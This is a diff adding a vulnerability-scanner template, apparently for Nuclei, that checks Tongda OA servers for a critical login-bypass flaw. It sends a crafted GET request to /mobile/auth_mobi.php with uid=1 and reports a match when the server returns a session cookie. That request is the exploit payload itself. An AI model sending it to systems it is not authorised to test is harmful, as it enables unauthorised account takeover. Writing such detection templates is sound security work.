@@ -1,0 +1,20 @@
+id: tongda_bypass_login
+info:
+  author: str1am
+  name: "\u901A\u8FBEoa\u5728\u7EBF\u7528\u6237\u767B\u5F55\u6F0F\u6D1E"
+  severity: critical
+  tags: tongda,bypass
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: header
+    type: word
+    words:
+    - 'Set-Cookie: PHPSESSID='
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
